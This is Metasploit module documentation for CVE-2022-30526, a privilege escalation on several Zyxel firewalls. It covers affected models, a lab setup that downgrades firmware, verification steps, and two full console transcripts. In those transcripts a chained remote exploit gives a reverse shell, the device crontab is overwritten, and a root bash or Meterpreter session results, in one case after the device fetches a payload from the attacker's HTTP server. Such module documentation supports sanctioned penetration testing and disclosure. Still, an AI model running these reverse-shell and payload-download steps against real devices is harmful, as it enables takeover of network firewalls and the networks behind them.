## Vulnerable Application

### Description

This module exploits CVE-2022-30526, a local privilege escalation vulnerability that
allows a low privileged user (e.g. `nobody`) escalate to root. The issue stems from
a suid binary that allows all users to copy files as `root`. This module overwrites
the firewall's crontab to execute an attacker provided script, resulting in code
execution as `root`.

In order to use this module, the attacker must first establish shell access. For
example, by exploiting CVE-2022-30525.

Known affected Zyxel models are:

* USG FLEX 50, 50W, 100W, 200, 500, 700
* ATP 100, 200, 500, 700, 800
* VPN 50, 100, 300, 1000
* USG20-VPN and USG20W-VPN

### Setup

The vulnerable system is a hardware firewall/vpn that, to our knowledge,
cannot be emulated. As such, testing requires a physical device. Once the
device has been acquired, you'll need to accomplish the following:

* Once powered on, register the device with Zyxel. You cannot do anything
with the device until this is accomplished. Fortunately, the web interface
will force you to complete this process. You'll need to create an account at
https://portal.myzyxel.com and the firewall will need internet connectivity
to complete the process.

* Once the device is up to date, you'll need to downgrade the firmware. From
portal.myzyxel.com you can download old firmware from:

Devices Management -> Firmware Download

From there you can select model and version to download. The last vulnerable
version from the affected systems is 5.21 Patch 1.

* Once you are using the vulnerable version, there is no special configuration
you need to exploit from the LAN. If you want to exploit from the WAN, you'll
need to enable "HTTP" and/or "HTTPS" through the firewall. From the web interface
do:

Configuration -> Objects -> Service -> Service Group -> Default_Allow_WAN_To_ZyWALL

And move "HTTP" and/or "HTTPS" from the left column to the right. After applying
the firewall should pass HTTP/HTTPS through the firewall to the web interface.

* That's it. You are good to go.

## Verification Steps

* Follow setup steps above.
* Establish a shell on the device. See `exploit/linux/http/zyxel_ztp_rce`
* Do: `use exploit/linux/local/zyxel_suid_cp_lpe`
* Do: `check`
* Verify the remote host is exploitable
* Do: `set LHOST <ip>`
* Do: `run`
* Verify the module acquires a root shell

## Options

## Scenarios

### Successful escalation to root bash shell on USG Flex 100 using firmware 5.21

```
msf6 > use exploit/linux/http/zyxel_ztp_rce
[*] Using configured payload cmd/unix/reverse_bash
msf6 exploit(linux/http/zyxel_ztp_rce) > set RHOST 10.0.0.14
RHOST => 10.0.0.14
msf6 exploit(linux/http/zyxel_ztp_rce) > set LHOST 10.0.0.28
LHOST => 10.0.0.28
msf6 exploit(linux/http/zyxel_ztp_rce) > run

[*] Started reverse TCP handler on 10.0.0.28:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. This was determined by the model and build date: USG FLEX 100, 220315042158
[*] Executing Shell Dropper for cmd/unix/reverse_bash
[*] Sending command to /ztp/cgi-bin/handler
[*] Command shell session 1 opened (10.0.0.28:4444 -> 10.0.0.14:50827) at 2022-05-13 11:55:47 -0700
[+] Command successfully executed.

id
uid=99(nobody) gid=10003(shadowr) groups=99,10003(shadowr)
cat /zyinit/fwversion
KERNEL_VERSION=3.10.87
FIRMWARE_VER=5.21(ABUH.1)521-r103462-k3
CAPWAP_VER=1.00.04
COMPATIBLE_PRODUCT_MODEL_0=E15D
COMPATIBLE_PRODUCT_MODEL_1=FFFF
COMPATIBLE_PRODUCT_MODEL_2=FFFF
COMPATIBLE_PRODUCT_MODEL_3=FFFF
COMPATIBLE_PRODUCT_MODEL_4=FFFF
MODEL_ID=USG FLEX 100
KERNEL_BUILD_DATE=2022-03-15 03:18:23
BUILD_DATE=2022-03-15 05:14:23
FSH_VER=1.0.0
^Z
Background session 1? [y/N]  y
msf6 exploit(linux/http/zyxel_ztp_rce) > use exploit/linux/local/zyxel_suid_cp_lpe
[*] Using configured payload cmd/unix/reverse_bash
msf6 exploit(linux/local/zyxel_suid_cp_lpe) > set LHOST 10.0.0.28
LHOST => 10.0.0.28
msf6 exploit(linux/local/zyxel_suid_cp_lpe) > set session 1
session => 1
msf6 exploit(linux/local/zyxel_suid_cp_lpe) > run

[*] Started reverse TCP handler on 10.0.0.28:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. System version: USG FLEX 100, 5.21(ABUH.1)521-r103462-k3
[*] Executing Unix Command for cmd/unix/reverse_bash
[*] Overwriting /var/zyxel/crontab
[*] The payload may take up to 60 seconds to be executed by cron
[+] Deleted /tmp/bJUQqm
[*] Resetting crontab to the original version
[+] Deleted /tmp/IcNlzvnv5
[*] Command shell session 2 opened (10.0.0.28:4444 -> 10.0.0.14:50829) at 2022-05-13 11:57:08 -0700

id
uid=0(root) gid=0(root) groups=0(root)
uname -a
Linux usgflex100 3.10.87-rt80-Cavium-Octeon #2 SMP Tue Mar 15 05:14:51 CST 2022 mips64 Cavium Octeon III V0.2 FPU V0.0 ROUTER7000_REF (CN7020p1.2-1200-AAP) GNU/Linux
```

### Successful escalation to root Meterpreter on USG Flex 100 using firmware 5.21

```
msf6 > use exploit/linux/http/zyxel_ztp_rce
[*] Using configured payload cmd/unix/reverse_bash
msf6 exploit(linux/http/zyxel_ztp_rce) > set RHOST 10.0.0.14
RHOST => 10.0.0.14
msf6 exploit(linux/http/zyxel_ztp_rce) > set LHOST 10.0.0.28
LHOST => 10.0.0.28
msf6 exploit(linux/http/zyxel_ztp_rce) > run

[*] Started reverse TCP handler on 10.0.0.28:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. This was determined by the model and build date: USG FLEX 100, 220315042158
[*] Executing Shell Dropper for cmd/unix/reverse_bash
[*] Sending command to /ztp/cgi-bin/handler
[*] Command shell session 1 opened (10.0.0.28:4444 -> 10.0.0.14:50827) at 2022-05-13 11:55:47 -0700
[+] Command successfully executed.

id
uid=99(nobody) gid=10003(shadowr) groups=99,10003(shadowr)
cat /zyinit/fwversion
KERNEL_VERSION=3.10.87
FIRMWARE_VER=5.21(ABUH.1)521-r103462-k3
CAPWAP_VER=1.00.04
COMPATIBLE_PRODUCT_MODEL_0=E15D
COMPATIBLE_PRODUCT_MODEL_1=FFFF
COMPATIBLE_PRODUCT_MODEL_2=FFFF
COMPATIBLE_PRODUCT_MODEL_3=FFFF
COMPATIBLE_PRODUCT_MODEL_4=FFFF
MODEL_ID=USG FLEX 100
KERNEL_BUILD_DATE=2022-03-15 03:18:23
BUILD_DATE=2022-03-15 05:14:23
FSH_VER=1.0.0
^Z
Background session 1? [y/N]  y
msf6 exploit(linux/http/zyxel_ztp_rce) > use exploit/linux/local/zyxel_suid_cp_lpe
[*] Using configured payload cmd/unix/reverse_bash
msf6 exploit(linux/local/zyxel_suid_cp_lpe) > set LHOST 10.0.0.28
LHOST => 10.0.0.28
msf6 exploit(linux/local/zyxel_suid_cp_lpe) > set session 1
session => 1
msf6 exploit(linux/local/zyxel_suid_cp_lpe) > set target 1
target => 1
msf6 exploit(linux/local/zyxel_suid_cp_lpe) > run

[*] Started reverse TCP handler on 10.0.0.28:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. System version: USG FLEX 100, 5.21(ABUH.1)521-r103462-k3
[*] Executing Linux Dropper for linux/mips64/meterpreter_reverse_tcp
[*] Using URL: http://10.0.0.28:8080/0g5aPNZ8DvT1n
[*] Overwriting /var/zyxel/crontab
[*] The payload may take up to 60 seconds to be executed by cron
[*] Client 10.0.0.14 (curl/7.70.0) requested /0g5aPNZ8DvT1n
[*] Sending payload to 10.0.0.14 (curl/7.70.0)
[+] Deleted /tmp/hdpBYBRk
[+] Deleted /tmp/OpTYd0c0
[*] Meterpreter session 3 opened (10.0.0.28:4444 -> 10.0.0.14:50832) at 2022-05-13 12:00:01 -0700
[*] Command Stager progress - 100.00% done (115/115 bytes)
[*] Resetting crontab to the original version
[*] Server stopped.

meterpreter > shell
Process 29664 created.
Channel 1 created.
id
uid=0(root) gid=0(root) groups=0(root)
uname -a
Linux usgflex100 3.10.87-rt80-Cavium-Octeon #2 SMP Tue Mar 15 05:14:51 CST 2022 mips64 Cavium Octeon III V0.2 FPU V0.0 ROUTER7000_REF (CN7020p1.2-1200-AAP) GNU/Linux
```
